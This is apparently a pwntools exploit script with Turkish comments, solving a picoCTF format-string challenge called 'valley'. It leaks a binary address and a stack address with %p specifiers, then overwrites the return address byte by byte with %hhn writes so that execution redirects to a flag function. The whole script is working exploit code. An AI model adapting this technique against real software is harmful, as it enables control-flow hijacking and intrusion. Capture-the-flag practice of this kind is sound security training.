#!/usr/bin/env python3

from pwn import *

context.binary = "./valley"

if args.DEBUG:
    context.log_level = 'DEBUG'

if args.REMOTE:
    p = remote("shape-facility.picoctf.net",49861)
else:
    p = process("./valley")

context.gdb_binary = "pwndbg"
if args.TMUX:
    context.terminal = ['tmux', 'split-pane', '-h']
if args.GDB:
    gdb.attach(p)

# %21$p -> yazacağımız adres olacak
# son iki byte şu olmalı: 0x5269
# iki yazma yapacağız

# ilk yazma için 0x52 (82) byte yazacağız, sonra stack'ten RET adr değiştireceğiz.
# %1$p -> 14 byte bastırıyor
# o zaman 5 * 14 + 12 yaparsak 82 byte'a ulaşırız
# yazacağımız adresin de 
p.recvuntil(b"Shouting:")

read_sptr_fmt = b"%21$p:%20$p"
p.sendline(read_sptr_fmt)

p.recvuntil(b"distance:")
ptrs = p.recvline()

log.info(f"ptrs = {ptrs}")
bin_addr, stack_addr = ptrs.strip().split(b":")
flag_addr = int(bin_addr, 16) - 426
ret_adr = int(stack_addr, 16) + 88 - 96

log.info(f"flag = 0x{flag_addr:x}")
log.info(f"ret =  0x{ret_adr:x}")

write_fmt = b"%105x" + b"%8$hhnAAAAA"  + p64(ret_adr)

# get the 2. byte 
second_lsb = (flag_addr >> 8) & 0xff
log.info("second = "+hex(second_lsb))
second_write_fmt = b"%" + str(second_lsb).encode() + b"x%8$hhn" + (8 - len(str(second_lsb)))*b"B" + p64(ret_adr+1) + b"CCCCCCCC" 
log.info(f"second stage: {second_write_fmt}")

p.sendline(write_fmt)
p.recv()
p.sendline(second_write_fmt)

p.recv()
p.sendline(b"exit")

p.interactive()
